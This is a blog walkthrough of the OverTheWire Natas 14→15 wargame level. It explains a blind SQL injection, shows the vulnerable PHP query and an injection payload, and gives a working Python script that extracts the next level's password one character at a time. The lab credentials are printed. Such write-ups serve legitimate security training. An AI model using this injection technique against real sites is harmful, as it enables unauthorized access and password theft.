---
layout: post-with-comments
title: "OverTheWire Natas Level 14 → 15 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-14-to-15/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, sql-injection, blind-sqli]
description: "A step by step tutorial for OverTheWire Natas Level 14 → 15!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-13-to-14/' | relative_url }}">← Previous: Level 13 → 14</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas15.html" target="_blank" rel="noopener">
      Official (Level 15) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-15-to-16/' | relative_url }}">
      Next: Level 15 → 16 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas15.natas.labs.overthewire.org>  
Credentials: **natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**

```bash
# Using curl (optional):
curl -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx http://natas15.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-14-to-15/homepage.jpg' | relative_url }})

---

## Task

Unlike level 14, this login form does **not leak the password directly**.
The only feedback we get is:

* “This user exists.”
* “This user doesn’t exist.”

That means we’re dealing with a **blind SQL injection**.

---

## A little bit of Theory

Relevant snippet:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

Observations:

* The query only checks for `username`.
* No password field is used here.
* If we inject SQL, the page will only tell us whether the condition is **true** or **false**.

We can exploit this by asking **yes/no questions** such as:

```sql
SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY "a%"
```

If the password really starts with `a`, the query matches → response: *This user exists*.
Otherwise → *This user doesn’t exist*.

By brute forcing character by character, we can reconstruct the whole password.

---

## Solution

### Step 1: Build a payload

We inject into `username` with:

```
natas16" AND password LIKE BINARY "a%" #
```

![user]({{ '/assets/images/natas/level-14-to-15/user.jpg' | relative_url }})

### Step 2: Automate with Python

```python
import requests
import sys
from string import ascii_lowercase, ascii_uppercase, digits

url = "http://natas15.natas.labs.overthewire.org/"
charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()
s.auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

password = ""
while len(password) < 32:
    for char in charset:
        r = s.post(url, data={"username": sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```

* The script loops over the charset.
* For each guess, it asks: *Does the password start with my guess so far?*
* If the response is *This user exists*, we keep the char.
* Repeat until we recover all 32 chars.

![output]({{ '/assets/images/natas/level-14-to-15/output.jpg' | relative_url }})

---

## Password

```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

---

**Troubleshooting**

* Script prints nothing? → Double-check your session credentials.
* Always “user doesn’t exist”? → Make sure your injection ends with `%` and quotes are balanced.
* Too slow? → Try a reduced charset first (e.g., only `abcdef0123456789`).

---

**Great job 🎉** You just executed a **blind SQL injection** to leak the entire password for **natas16**.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

